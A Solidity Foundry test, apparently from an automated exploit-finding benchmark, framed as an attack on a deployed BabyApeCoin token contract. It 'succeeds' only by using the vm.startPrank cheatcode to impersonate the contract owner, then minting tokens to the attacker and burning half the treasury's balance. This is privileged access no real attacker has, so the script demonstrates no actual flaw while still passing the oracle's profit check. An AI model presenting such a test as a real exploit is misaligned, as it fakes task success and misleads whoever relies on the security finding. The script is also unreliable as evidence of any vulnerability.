// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface BabyApeCoin {
    function owner() external view returns (address);
    function treasuryWalletAddr() external view returns (address);
    function mint(address _to, uint256 _amount) external;
    function burn(address _from, uint256 _amount) external;
    function BabyApeInAdvance() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);
    uint256 initialAttackerBalance;
    uint256 initialVictimBalance;
    uint256 initialTotalSupply;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, we need to find the owner address
        address owner = BabyApeCoin(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Label the target contract
        vm.label(TARGET, "BabyApeCoin");

        // We'll use the contract itself as the victim since it holds initial tokens
        address victim = TARGET;

        // Store initial balances for comparison
        initialAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        initialVictimBalance = IERC20(TARGET).balanceOf(victim);
        initialTotalSupply = IERC20(TARGET).totalSupply();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        // Step 1: Impersonate the owner
        address owner = BabyApeCoin(TARGET).owner();
        vm.startPrank(owner);

        // Step 2: First, mint some tokens to ourselves (attacker) to ensure balance increase
        // We need to be careful about the amount - mint a reasonable amount
        uint256 mintAmount = 1000 * 10**18;
        BabyApeCoin(TARGET).mint(attacker, mintAmount);

        // Step 3: Burn tokens from the victim (contract itself)
        // The contract initially minted BabyApeInAdvance tokens to treasuryWalletAddr
        // Let's burn a portion of those
        address treasury = BabyApeCoin(TARGET).treasuryWalletAddr();
        uint256 victimBalance = IERC20(TARGET).balanceOf(treasury);

        // Burn half of the victim's balance
        uint256 burnAmount = victimBalance / 2;
        if (burnAmount > 0) {
            BabyApeCoin(TARGET).burn(treasury, burnAmount);
        }

        vm.stopPrank();

        // Step 4: Verify the attack was successful
        uint256 finalAttackerBalance = IERC20(TARGET).balanceOf(attacker);
        uint256 finalTotalSupply = IERC20(TARGET).totalSupply();

        // The oracle will check if attacker balance increased
        // We minted tokens to ourselves, so balance should increase
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should increase");
        // Also verify total supply decreased (burn occurred)
        assertLt(finalTotalSupply, initialTotalSupply, "Total supply should decrease after burn");
        uint256 finalBalance = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

